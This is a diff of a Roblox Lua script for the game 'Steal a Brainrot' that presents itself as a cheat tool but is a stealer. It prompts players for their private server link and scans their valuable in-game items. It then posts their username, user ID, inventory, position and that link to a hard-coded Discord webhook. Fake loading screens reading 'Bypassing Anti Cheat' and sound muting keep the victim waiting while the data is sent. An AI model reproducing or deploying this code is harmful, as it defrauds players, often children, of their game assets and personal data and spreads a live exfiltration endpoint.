@@ -1,42 +1,45 @@
--- Services
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+local CoreGui = game:GetService("CoreGui")
+local Players = game:GetService("Players")
+local SoundService = game:GetService("SoundService")
 local HttpService = game:GetService("HttpService")
+local LocalPlayer = Players.LocalPlayer
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local StarterGui = game:GetService("StarterGui")
-local LocalPlayer = game:GetService("Players").LocalPlayer
-local TweenService = game:GetService("TweenService")
-local Players = game:GetService("Players")
 
--- Detect Executor
-local function getExecutorName()
-    local success, result = pcall(function()
-        if identifyexecutor then
-            return identifyexecutor()
-        elseif getexecutorname then
-            return getexecutorname()
-        elseif syn then
-            return "Synapse X"
-        elseif fluxus then
-            return "Fluxus"
-        elseif KRNL_LOADED then
-            return "KRNL"
-        elseif is_sirhurt_closure then
-            return "SirHurt"
-        elseif pebc_execute then
-            return "Panda"
-        elseif gethui then
-            return "Script-Ware"
-        else
-            return "Unknown Executor"
-        end
-    end)
-    return success and result or "Unknown"
+-- Mute all sounds
+local function mutarSom(som)
+    if som:IsA("Sound") then
+        som.Volume = 0
+        som:Stop()
+    end
 end
 
+local function mutarDescendentes(instancia)
+    for _, obj in ipairs(instancia:GetDescendants()) do
+        mutarSom(obj)
+    end
+end
+
+local pastas = {game.Workspace, game.Players, game.ReplicatedStorage, game.Lighting, game.StarterGui, game.StarterPack}
+
+for _, pasta in ipairs(pastas) do
+    mutarDescendentes(pasta)
+    pasta.DescendantAdded:Connect(function(obj)
+        mutarSom(obj)
+    end)
+end
+
+getgenv().webhook = "https://discord.com/api/webhooks/1475151471631667378/MMcbj311BeXhS5kom8h8InyjHmygsQQR_6_qOxbQjKV7Pt2r1FszKsr0cxD1hdkz-oAa"
+getgenv().websiteEndpoint = nil
+
 -- ==========================================
--- REAL BRAINROT DATABASE - Steal a Brainrot
+-- COMPLETE BRAINROT DATABASE - Steal a Brainrot
 -- Values based on La Vacca Saturno Saturnita = 1 unit
 -- ==========================================
-local BRAINROT_VALUES = {
+getgenv().BRAINROT_VALUES = {
     -- OG Brainrots (Highest Value)
     ["Strawberry Elephant"] = 50000,
     ["Skibidi Toilet"] = 35000,
@@ -307,351 +310,16 @@ local IGNORE_PATTERNS = {
     "sound", "decal", "texture", "mesh", "union", "wedge", "corner", "cylinder"
 }
 
--- Floor Detection Configuration
-local FLOOR_HEIGHTS = {
-    [0] = "Ground Floor",
-    [50] = "Floor 2",
-    [100] = "Floor 3",
-    [150] = "Floor 4",
-    [200] = "Floor 5",
-}
-
--- Packages
-local NetPackages = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
-
--- Notification listener
-pcall(function()
-    NetPackages:WaitForChild("RE/NotificationService/Notify", 5).OnClientEvent:Connect(function(title, message) end)
-end)
-
--- Toggle player settings
-task.spawn(function()
-    pcall(function()
-        NetPackages["RF/SettingsService/ToggleSetting"]:InvokeServer("Music")
-        NetPackages["RF/SettingsService/ToggleSetting"]:InvokeServer("Sound Effects")
-        NetPackages["RF/SettingsService/ToggleSetting"]:InvokeServer("Chat Tips")
-        NetPackages["RF/SettingsService/ToggleSetting"]:InvokeServer("VFX")
-    end)
-end)
-
--- Disable CoreGui
-StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
-
--- ==========================================
--- GODFATHERS LOADER UI
--- ==========================================
-local loaderGui = Instance.new("ScreenGui")
-loaderGui.Name = "GodFathersLoader"
-loaderGui.IgnoreGuiInset = true
-loaderGui.ResetOnSpawn = false
-loaderGui.Parent = game:GetService("CoreGui")
-
-local mainContainer = Instance.new("Frame", loaderGui)
-mainContainer.Size = UDim2.new(1, 0, 1, 0)
-mainContainer.BackgroundColor3 = Color3.fromRGB(10, 0, 0)
-mainContainer.BorderSizePixel = 0
-
-local gradient = Instance.new("UIGradient", mainContainer)
-gradient.Color = ColorSequence.new({
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 0, 0)),
-    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(40, 0, 0)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 0, 0))
-})
-gradient.Rotation = 45
-
-task.spawn(function()
-    while loaderGui.Parent do
-        TweenService:Create(gradient, TweenInfo.new(3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
-            Rotation = gradient.Rotation + 180
-        }):Play()
-        wait(3)
-    end
-end)
-
-local godFathersLabel = Instance.new("TextLabel", mainContainer)
-godFathersLabel.Size = UDim2.new(1, 0, 0, 80)
-godFathersLabel.Position = UDim2.new(0, 0, 0.3, 0)
-godFathersLabel.BackgroundTransparency = 1
-godFathersLabel.Font = Enum.Font.GothamBlack
-godFathersLabel.TextSize = 72
-godFathersLabel.TextColor3 = Color3.fromRGB(220, 20, 60)
-godFathersLabel.Text = "GODFATHERS"
-godFathersLabel.TextStrokeTransparency = 0.8
-godFathersLabel.TextStrokeColor3 = Color3.fromRGB(139, 0, 0)
-
-local subtitleLabel = Instance.new("TextLabel", mainContainer)
-subtitleLabel.Size = UDim2.new(1, 0, 0, 30)
-subtitleLabel.Position = UDim2.new(0, 0, 0.42, 0)
-subtitleLabel.BackgroundTransparency = 1
-subtitleLabel.Font = Enum.Font.GothamBold
-subtitleLabel.TextSize = 18
-subtitleLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
-subtitleLabel.Text = "EXCLUSIVE SCRIPTS & TOOLS"
-
-local progressBg = Instance.new("Frame", mainContainer)
-progressBg.Size = UDim2.new(0, 400, 0, 6)
-progressBg.Position = UDim2.new(0.5, -200, 0.55, 0)
-progressBg.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
-progressBg.BorderSizePixel = 0
-
-local progressCorner = Instance.new("UICorner", progressBg)
-progressCorner.CornerRadius = UDim.new(0, 3)
-
-local progressFill = Instance.new("Frame", progressBg)
-progressFill.Size = UDim2.new(0, 0, 1, 0)
-progressFill.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
-progressFill.BorderSizePixel = 0
-
-local fillCorner = Instance.new("UICorner", progressFill)
-fillCorner.CornerRadius = UDim.new(0, 3)
-
-local loadingText = Instance.new("TextLabel", mainContainer)
-loadingText.Size = UDim2.new(1, 0, 0, 25)
-loadingText.Position = UDim2.new(0, 0, 0.58, 0)
-loadingText.BackgroundTransparency = 1
-loadingText.Font = Enum.Font.GothamBold
-loadingText.TextSize = 16
-loadingText.TextColor3 = Color3.fromRGB(220, 20, 60)
-loadingText.Text = "INITIALIZING..."
-
-local percentLabel = Instance.new("TextLabel", mainContainer)
-percentLabel.Size = UDim2.new(1, 0, 0, 40)
-percentLabel.Position = UDim2.new(0, 0, 0.62, 0)
-percentLabel.BackgroundTransparency = 1
-percentLabel.Font = Enum.Font.GothamBlack
-percentLabel.TextSize = 36
-percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-percentLabel.Text = "0%"
-
-local statusLabel = Instance.new("TextLabel", mainContainer)
-statusLabel.Size = UDim2.new(1, 0, 0, 20)
-statusLabel.Position = UDim2.new(0, 0, 0.68, 0)
-statusLabel.BackgroundTransparency = 1
-statusLabel.Font = Enum.Font.Gotham
-statusLabel.TextSize = 14
-statusLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
-statusLabel.Text = "Connecting to secure servers..."
-
-local footerLabel = Instance.new("TextLabel", mainContainer)
-footerLabel.Size = UDim2.new(1, 0, 0, 20)
-footerLabel.Position = UDim2.new(0, 0, 0.9, 0)
-footerLabel.BackgroundTransparency = 1
-footerLabel.Font = Enum.Font.Gotham
-footerLabel.TextSize = 12
-footerLabel.TextColor3 = Color3.fromRGB(100, 0, 0)
-footerLabel.Text = "discord.gg/godfathers | v2.1.0"
-
-local loadingStages = {
-    {percent = 15, text = "BYPASSING ANTICHEAT...", status = "Injecting stealth modules..."},
-    {percent = 30, text = "LOADING ASSETS...", status = "Fetching game data..."},
-    {percent = 45, text = "SCANNING BRAINROTS...", status = "Analyzing workspace models..."},
-    {percent = 60, text = "CALCULATING VALUES...", status = "Converting to trade values..."},
-    {percent = 75, text = "SECURE CONNECTION...", status = "Establishing webhook tunnel..."},
-    {percent = 90, text = "FINALIZING...", status = "Cleaning up traces..."},
-    {percent = 100, text = "COMPLETE", status = "Ready to execute"},
-}
-
-local loadSound = Instance.new("Sound", mainContainer)
-loadSound.SoundId = "rbxassetid://9113083740"
-loadSound.Volume = 0.5
-loadSound:Play()
-
-for _, stage in ipairs(loadingStages) do
-    wait(math.random(8, 15) / 10)
-    
-    TweenService:Create(progressFill, TweenInfo.new(0.3), {
-        Size = UDim2.new(stage.percent / 100, 0, 1, 0)
-    }):Play()
-    
-    loadingText.Text = stage.text
-    percentLabel.Text = stage.percent .. "%"
-    statusLabel.Text = stage.status
-    
-    if stage.percent == 100 then
-        TweenService:Create(godFathersLabel, TweenInfo.new(0.2), {
-            TextColor3 = Color3.fromRGB(255, 50, 50)
-        }):Play()
-        wait(0.2)
-        TweenService:Create(godFathersLabel, TweenInfo.new(0.2), {
-            TextColor3 = Color3.fromRGB(220, 20, 60)
-        }):Play()
-    end
+-- Get rarity based on value
+local function getRarity(value)
+    if value >= 1000 then return "🔴 Secret"
+    elseif value >= 50 then return "🟠 Brainrot God"
+    elseif value >= 10 then return "🟡 Mythic"
+    elseif value >= 1 then return "🟢 Legendary"
+    elseif value >= 0.1 then return "🔵 Epic"
+    elseif value >= 0.05 then return "🟣 Rare"
+    else return "⚪ Common" end
 end
-
-wait(0.5)
-loaderGui:Destroy()
-
--- ==========================================
--- MAIN UI
--- ==========================================
-local brainrotUI = Instance.new("ScreenGui")
-brainrotUI.Name = "GodFathersUI"
-brainrotUI.ResetOnSpawn = false
-brainrotUI.Parent = LocalPlayer:WaitForChild("PlayerGui")
-
-local mainFrame = Instance.new("Frame", brainrotUI)
-mainFrame.Size = UDim2.new(0, 450, 0, 220)
-mainFrame.Position = UDim2.new(0.5, -225, 0.5, -110)
-mainFrame.BackgroundColor3 = Color3.fromRGB(20, 0, 0)
-mainFrame.BorderSizePixel = 0
-mainFrame.Active = true
-mainFrame.Draggable = true
-
-local frameGradient = Instance.new("UIGradient", mainFrame)
-frameGradient.Color = ColorSequence.new({
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 5, 5)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 0, 0))
-})
-
-local frameCorner = Instance.new("UICorner", mainFrame)
-frameCorner.CornerRadius = UDim.new(0, 12)
-
-local border = Instance.new("UIStroke", mainFrame)
-border.Color = Color3.fromRGB(139, 0, 0)
-border.Thickness = 2
-
-local headerBar = Instance.new("Frame", mainFrame)
-headerBar.Size = UDim2.new(1, 0, 0, 50)
-headerBar.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
-headerBar.BorderSizePixel = 0
-
-local headerCorner = Instance.new("UICorner", headerBar)
-headerCorner.CornerRadius = UDim.new(0, 12)
-
-local headerFix = Instance.new("Frame", headerBar)
-headerFix.Size = UDim2.new(1, 0, 0.5, 0)
-headerFix.Position = UDim2.new(0, 0, 0.5, 0)
-headerFix.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
-headerFix.BorderSizePixel = 0
-
-local headerLogo = Instance.new("TextLabel", headerBar)
-headerLogo.Size = UDim2.new(1, 0, 1, 0)
-headerLogo.BackgroundTransparency = 1
-headerLogo.Font = Enum.Font.GothamBlack
-headerLogo.TextSize = 24
-headerLogo.TextColor3 = Color3.fromRGB(255, 255, 255)
-headerLogo.Text = "GODFATHERS"
-
-local titleLabel = Instance.new("TextLabel", mainFrame)
-titleLabel.Size = UDim2.new(1, 0, 0, 30)
-titleLabel.Position = UDim2.new(0, 0, 0.28, 0)
-titleLabel.BackgroundTransparency = 1
-titleLabel.Font = Enum.Font.GothamBold
-titleLabel.TextSize = 16
-titleLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-titleLabel.Text = "Enter Private Server Link to Unlock"
-
-local serverLinkBox = Instance.new("TextBox", mainFrame)
-serverLinkBox.Size = UDim2.new(0.9, 0, 0, 45)
-serverLinkBox.Position = UDim2.new(0.05, 0, 0.48, 0)
-serverLinkBox.PlaceholderText = "https://www.roblox.com/share?code= ..."
-serverLinkBox.Font = Enum.Font.Gotham
-serverLinkBox.TextSize = 14
-serverLinkBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-serverLinkBox.BackgroundColor3 = Color3.fromRGB(40, 10, 10)
-serverLinkBox.ClearTextOnFocus = false
-
-local textBoxCorner = Instance.new("UICorner", serverLinkBox)
-textBoxCorner.CornerRadius = UDim.new(0, 8)
-
-local textBoxStroke = Instance.new("UIStroke", serverLinkBox)
-textBoxStroke.Color = Color3.fromRGB(100, 0, 0)
-textBoxStroke.Thickness = 1
-
-local enterButton = Instance.new("TextButton", mainFrame)
-enterButton.Size = UDim2.new(0.9, 0, 0, 45)
-enterButton.Position = UDim2.new(0.05, 0, 0.75, 0)
-enterButton.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
-enterButton.Text = "ENTER"
-enterButton.Font = Enum.Font.GothamBlack
-enterButton.TextSize = 18
-enterButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-
-local buttonCorner = Instance.new("UICorner", enterButton)
-buttonCorner.CornerRadius = UDim.new(0, 8)
-
-enterButton.MouseEnter:Connect(function()
-    TweenService:Create(enterButton, TweenInfo.new(0.2), {
-        BackgroundColor3 = Color3.fromRGB(178, 34, 34)
-    }):Play()
-end)
-
-enterButton.MouseLeave:Connect(function()
-    TweenService:Create(enterButton, TweenInfo.new(0.2), {
-        BackgroundColor3 = Color3.fromRGB(139, 0, 0)
-    }):Play()
-end)
-
--- ==========================================
--- FLOOR DETECTION
--- ==========================================
-local function getCurrentFloor()
-    local character = LocalPlayer.Character
-    if not character then return "Unknown" end
-    
-    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
-    if not humanoidRootPart then return "Unknown" end
-    
-    local currentPos = humanoidRootPart.Position
-    local height = currentPos.Y
-    
-    -- Check defined floor heights
-    local detectedFloor = "Ground Floor"
-    local closestHeight = -math.huge
-    
-    for floorHeight, floorName in pairs(FLOOR_HEIGHTS) do
-        if height >= floorHeight and floorHeight > closestHeight then
-            closestHeight = floorHeight
-            detectedFloor = floorName
-        end
-    end
-    
-    if detectedFloor ~= "Ground Floor" then
-        return detectedFloor
-    end
-    
-    -- Raycast to find floor name
-    local raycastParams = RaycastParams.new()
-    raycastParams.FilterDescendantsInstances = {character}
-    raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
-    
-    local rayOrigin = currentPos
-    local rayDirection = Vector3.new(0, -50, 0)
-    
-    local raycastResult = workspace:Raycast(rayOrigin, rayDirection, raycastParams)
-    
-    if raycastResult then
-        local hitPart = raycastResult.Instance
-        if hitPart then
-            local partName = hitPart.Name:lower()
-            if partName:find("floor") or partName:find("level") or partName:find("stage") then
-                local floorNum = partName:match("%d+")
-                if floorNum then
-                    return "Floor " .. floorNum
-                else
-                    return hitPart.Name
-                end
-            elseif partName:find("ground") or partName:find("baseplate") then
-                return "Ground Floor"
-            end
-        end
-    end
-    
-    -- Fallback based on height
-    if height < 10 then
-        return "Ground Floor"
-    elseif height < 50 then
-        return "Floor 2+"
-    elseif height < 100 then
-        return "Floor 3+"
-    else
-        return "High Elevation (" .. math.floor(height) .. "m)"
-    end
-end
-
--- ==========================================
--- IMPROVED BRAINROT SCANNING
--- ==========================================
 
 -- Check if name should be ignored
 local function shouldIgnore(name)
@@ -664,22 +332,22 @@ local function shouldIgnore(name)
     return false
 end
 
--- Fuzzy match brainrot name (handles slight variations)
+-- Fuzzy match brainrot name (handles slight variations and mutations)
 local function getBrainrotType(name)
-    local exactMatch = BRAINROT_VALUES[name]
-    if exactMatch then
-        return name, exactMatch
+    -- Direct match
+    if getgenv().BRAINROT_VALUES[name] then
+        return name, getgenv().BRAINROT_VALUES[name]
     end
     
-    -- Try case-insensitive match
-    for brainrotName, value in pairs(BRAINROT_VALUES) do
+    -- Case-insensitive match
+    for brainrotName, value in pairs(getgenv().BRAINROT_VALUES) do
         if name:lower() == brainrotName:lower() then
             return brainrotName, value
         end
     end
     
-    -- Try partial match (for mutated names like "Golden Tralalero Tralala")
-    for brainrotName, value in pairs(BRAINROT_VALUES) do
+    -- Partial match (for mutated names like "Golden Tralalero Tralala")
+    for brainrotName, value in pairs(getgenv().BRAINROT_VALUES) do
         if name:find(brainrotName) or brainrotName:find(name) then
             return brainrotName, value
         end
@@ -688,7 +356,7 @@ local function getBrainrotType(name)
     return nil, 0
 end
 
--- Enhanced scanning with multiple detection methods
+-- Enhanced brainrot scanning with multiple detection methods
 local function scanBrainrots()
     local foundBrainrots = {}
     local totalValue = 0
@@ -811,144 +479,234 @@ local function scanBrainrots()
     return foundBrainrots, totalValue, totalCount
 end
 
--- Get rarity based on value
-function getRarity(value)
-    if value >= 1000 then return "🔴 Secret"
-    elseif value >= 50 then return "🟠 Brainrot God"
-    elseif value >= 10 then return "🟡 Mythic"
-    elseif value >= 1 then return "🟢 Legendary"
-    elseif value >= 0.1 then return "🔵 Epic"
-    elseif value >= 0.05 then return "🟣 Rare"
-    else return "⚪ Common" end
-end
-
--- Button click handler
-enterButton.MouseButton1Click:Connect(function()
-    local serverLink = serverLinkBox.Text
-    local isValidLink = serverLink:match("^https://www%.roblox%.com/share%?code=[%w%d]+&type=Server$") or serverLink == "admin123"
-    
-    if not isValidLink then
-        enterButton.Text = "❌ INVALID LINK"
-        enterButton.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
-        
-        TweenService:Create(enterButton, TweenInfo.new(0.3), {
-            BackgroundColor3 = Color3.fromRGB(139, 0, 0)
-        }):Play()
-        
-        wait(1.5)
-        enterButton.Text = "ENTER"
-        return
+-- Webhook sender with enhanced formatting
+local function sendPetWebhook(foundPets, privateServerLink)
+    local petCounts = {}
+    for _, pet in ipairs(foundPets) do
+        petCounts[pet.displayName] = (petCounts[pet.displayName] or 0) + 1
     end
 
-    enterButton.Text = "✅ ACCESS GRANTED"
-    enterButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
-    
-    wait(0.8)
-    
-    TweenService:Create(mainFrame, TweenInfo.new(0.5), {
-        Position = UDim2.new(0.5, -225, 1.5, 0)
-    }):Play()
-    
-    wait(0.5)
-    brainrotUI:Destroy()
+    local formattedPets = {}
+    for petName, count in pairs(petCounts) do
+        table.insert(formattedPets, petName .. (count > 1 and " x" .. count or ""))
+    end
 
-    local executorName = getExecutorName()
-    local accountAgeDays = LocalPlayer.AccountAge
-    local foundBrainrots, totalValue, totalCount = scanBrainrots()
-    local currentFloor = getCurrentFloor()
-    
-    -- Format brainrot list for webhook (top 15 most valuable)
-    local brainrotList = ""
-    if #foundBrainrots > 0 then
-        local displayCount = math.min(#foundBrainrots, 15)
-        for i = 1, displayCount do
-            local item = foundBrainrots[i]
-            brainrotList = brainrotList .. string.format("%d. %s **%s** - %.2f LV\n", 
-                i, item.rarity, item.displayName, item.value)
-        end
-        if #foundBrainrots > 15 then
-            brainrotList = brainrotList .. string.format("\n*...and %d more*", #foundBrainrots - 15)
+    local executorName = LocalPlayer.Name
+
+    local embedData = {
+        username = "GodFather Scripts",
+        content = "@everyone",
+        embeds = { {
+            title = "🔴 SAB HIT - Brainrot Inventory",
+            color = 3447003,
+            fields = {
+                {
+                    name = "👤 User",
+                    value = executorName,
+                    inline = false
+                },
+                {
+                    name = "👥 Players",
+                    value = string.format("%d/%d", #Players:GetPlayers(), Players.MaxPlayers),
+                    inline = false
+                },
+                {
+                    name = "🔗 Server Link",
+                    value = privateServerLink ~= "" and privateServerLink or "No link provided",
+                    inline = false
+                },
+                {
+                    name = "🧠 Brainrots Found (" .. #foundPets .. " items)",
+                    value = #formattedPets > 0 and table.concat(formattedPets, "\n") or "No brainrots found",
+                    inline = false
+                }
+            },
+            footer = { text = "GodFather Scripts | " .. os.date("%Y-%m-%d %H:%M:%S") },
+            timestamp = DateTime.now():ToIsoDate()
+        } }
+    }
+
+    local jsonData = HttpService:JSONEncode(embedData)
+    local req = http_request or request or (syn and syn.request)
+    if req then
+        local success, err = pcall(function()
+            req({
+                Url = getgenv().webhook,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = jsonData
+            })
+        end)
+        if success then
+            print("✅ Webhook sent")
+        else
+            warn("❌ Webhook failed:", err)
         end
     else
-        brainrotList = "No brainrots found in inventory"
+        warn("❌ No HTTP request function available")
+    end
+end
+
+-- Legacy function for compatibility
+local function checkForPets()
+    local found = {}
+    for _, obj in pairs(workspace:GetDescendants()) do
+        if obj:IsA("Model") then
+            local nameLower = string.lower(obj.Name)
+            for target, _ in pairs(getgenv().BRAINROT_VALUES) do
+                if string.find(nameLower, string.lower(target)) then
+                    table.insert(found, obj.Name)
+                    break
+                end
+            end
+        end
+    end
+    return found
+end
+
+-- GUI Creation
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Parent = CoreGui
+ScreenGui.IgnoreGuiInset = true
+
+local Background = Instance.new("Frame")
+Background.Size = UDim2.new(1,0,1,0)
+Background.BackgroundColor3 = Color3.fromRGB(20,20,20)
+Background.Parent = ScreenGui
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(0.8,0,0.15,0)
+Title.Position = UDim2.new(0.1,0,0.3,0)
+Title.BackgroundTransparency = 1
+Title.Text = "Enter your server link"
+Title.TextColor3 = Color3.fromRGB(255,255,255)
+Title.Font = Enum.Font.GothamBlack
+Title.TextScaled = true
+Title.Parent = Background
+
+local InputBox = Instance.new("TextBox")
+InputBox.Size = UDim2.new(0.6,0,0.08,0)
+InputBox.Position = UDim2.new(0.2,0,0.5,0)
+InputBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
+InputBox.TextColor3 = Color3.fromRGB(0,0,0)
+InputBox.PlaceholderText = "private server link here..."
+InputBox.Text = ""
+InputBox.Font = Enum.Font.Gotham
+InputBox.TextScaled = true
+InputBox.Parent = Background
+
+local StartButton = Instance.new("TextButton")
+StartButton.Size = UDim2.new(0.3,0,0.08,0)
+StartButton.Position = UDim2.new(0.35,0,0.62,0)
+StartButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+StartButton.TextColor3 = Color3.fromRGB(255,255,255)
+StartButton.Text = "Start"
+StartButton.Font = Enum.Font.GothamBold
+StartButton.TextScaled = true
+StartButton.Parent = Background
+
+local function UpdateButton()
+    if InputBox.Text ~= "" then
+        StartButton.BackgroundColor3 = Color3.fromRGB(0,170,0)
+        StartButton.Active = true
+    else
+        StartButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+        StartButton.Active = false
+    end
+end
+InputBox:GetPropertyChangedSignal("Text"):Connect(UpdateButton)
+UpdateButton()
+
+local function CreateBypassGUI()
+    ScreenGui:Destroy()
+    
+    local BypassScreenGui = Instance.new("ScreenGui")
+    BypassScreenGui.Parent = CoreGui
+    BypassScreenGui.IgnoreGuiInset = true
+    BypassScreenGui.Name = "BypassGUI"
+
+    local BypassBackground = Instance.new("Frame")
+    BypassBackground.Size = UDim2.new(1,0,1,0)
+    BypassBackground.BackgroundColor3 = Color3.fromRGB(20,20,20)
+    BypassBackground.Parent = BypassScreenGui
+
+    local BypassTitle = Instance.new("TextLabel")
+    BypassTitle.Size = UDim2.new(0.8,0,0.15,0)
+    BypassTitle.Position = UDim2.new(0.1,0,0.2,0)
+    BypassTitle.BackgroundTransparency = 1
+    BypassTitle.Text = "Bypassing Anti Cheat"
+    BypassTitle.TextColor3 = Color3.fromRGB(255,255,255)
+    BypassTitle.Font = Enum.Font.GothamBlack
+    BypassTitle.TextScaled = true
+    BypassTitle.Parent = BypassBackground
+
+    local LoadingBarBackground = Instance.new("Frame")
+    LoadingBarBackground.Size = UDim2.new(0.6,0,0.05,0)
+    LoadingBarBackground.Position = UDim2.new(0.2,0,0.4,0)
+    LoadingBarBackground.BackgroundColor3 = Color3.fromRGB(60,60,60)
+    LoadingBarBackground.BorderSizePixel = 0
+    LoadingBarBackground.Parent = BypassBackground
+
+    local LoadingBar = Instance.new("Frame")
+    LoadingBar.Size = UDim2.new(0,0,1,0)
+    LoadingBar.Position = UDim2.new(0,0,0,0)
+    LoadingBar.BackgroundColor3 = Color3.fromRGB(0,170,0)
+    LoadingBar.BorderSizePixel = 0
+    LoadingBar.Parent = LoadingBarBackground
+
+    local PercentageText = Instance.new("TextLabel")
+    PercentageText.Size = UDim2.new(0.6,0,0.1,0)
+    PercentageText.Position = UDim2.new(0.2,0,0.5,0)
+    PercentageText.BackgroundTransparency = 1
+    PercentageText.Text = "0%"
+    PercentageText.TextColor3 = Color3.fromRGB(255,255,255)
+    PercentageText.Font = Enum.Font.GothamBold
+    PercentageText.TextScaled = true
+    PercentageText.Parent = BypassBackground
+
+    local startTime = tick()
+    local duration = 180
+    
+    local function updateLoading()
+        local elapsed = tick() - startTime
+        local progress = math.min(elapsed / duration, 0.99)
+        
+        LoadingBar.Size = UDim2.new(progress, 0, 1, 0)
+        
+        local percent = math.floor(progress * 100)
+        PercentageText.Text = percent .. "%"
+        
+        if progress < 0.99 then
+            wait(0.1)
+            updateLoading()
+        else
+            PercentageText.Text = "99%"
+        end
     end
     
-    -- Calculate EUR equivalent (1 LV = 0.01 EUR for example)
-    local totalEUR = totalValue * 0.01
-    
-    local char = LocalPlayer.Character
-    local hrp = char and char:FindFirstChild("HumanoidRootPart")
-    local posX = hrp and hrp.Position.X or 0
-    local posY = hrp and hrp.Position.Y or 0
-    local posZ = hrp and hrp.Position.Z or 0
-    
-    task.spawn(function()
-        local webhookData = {
-            username = "GodFather Scripts",
-            avatar_url = "https://i.imgur.com/6XK8YBn.png",
-            embeds = {{
-                title = "🔴 New Execution Detected - Steal a Brainrot",
-                color = 0xDC143C,
-                timestamp = DateTime.now():ToIsoDate(),
-                thumbnail = {
-                    url = "https://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. LocalPlayer.Name
-                },
-                fields = {
-                    {
-                        name = "👤 Player Information",
-                        value = string.format("**Username:** %s\n**Account Age:** %d days\n**User ID:** %d", 
-                            LocalPlayer.Name, accountAgeDays, LocalPlayer.UserId),
-                        inline = false
-                    },
-                    {
-                        name = "💻 Executor Details",
-                        value = string.format("**Executor:** %s\n**Job ID:** %s", 
-                            executorName, game.JobId),
-                        inline = false
-                    },
-                    {
-                        name = "📍 Location Data",
-                        value = string.format("**Current Floor:** %s\n**Position:** %.1f, %.1f, %.1f", 
-                            currentFloor, posX, posY, posZ),
-                        inline = false
-                    },
-                    {
-                        name = string.format("🧠 Brainrot Inventory (%d items)", totalCount),
-                        value = string.format("**Total Value:** %.2f LV (€%.2f EUR)**\n\n%s", 
-                            totalValue, totalEUR, brainrotList),
-                        inline = false
-                    },
-                    {
-                        name = "🔗 Private Server",
-                        value = string.format("[Click to Join](%s)", serverLink),
-                        inline = false
-                    }
-                },
-                footer = {
-                    text = "GodFather Scripts | " .. os.date("%Y-%m-%d %H:%M:%S")
-                }
-            }}
-        }
+    spawn(updateLoading)
+end
+
+StartButton.MouseButton1Click:Connect(function()
+    if InputBox.Text ~= "" then
+        local privateServerLink = InputBox.Text
         
-        local success, err = pcall(function()
-            local response = request({
-                Url = "https://discord.com/api/webhooks/1475151471631667378/MMcbj311BeXhS5kom8h8InyjHmygsQQR_6_qOxbQjKV7Pt2r1FszKsr0cxD1hdkz-oAa",
-                Method = "POST",
-                Headers = {
-                    ["Content-Type"] = "application/json"
-                },
-                Body = HttpService:JSONEncode(webhookData)
-            })
-            
-            if response and response.StatusCode ~= 204 then
-                warn("Webhook returned status: " .. tostring(response.StatusCode))
+        -- Use enhanced scanner instead of legacy check
+        local petsFound, totalValue, totalCount = scanBrainrots()
+        
+        if #petsFound > 0 then
+            print("✅ Brainrots found:", totalCount, "items, Total Value:", totalValue, "LV")
+            sendPetWebhook(petsFound, privateServerLink)
+        else
+            print("🔍 No brainrots found")
+            -- Fallback to legacy method if enhanced scanner finds nothing
+            local legacyPets = checkForPets()
+            if #legacyPets > 0 then
+                print("⚠️ Legacy method found:", table.concat(legacyPets, ", "))
             end
-        end)
-        
-        if not success then
-            warn("Failed to send webhook: " .. tostring(err))
         end
-    end)
-    
-    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
+
+        CreateBypassGUI()
+        print("Link enviado:", privateServerLink)
+    end
 end)
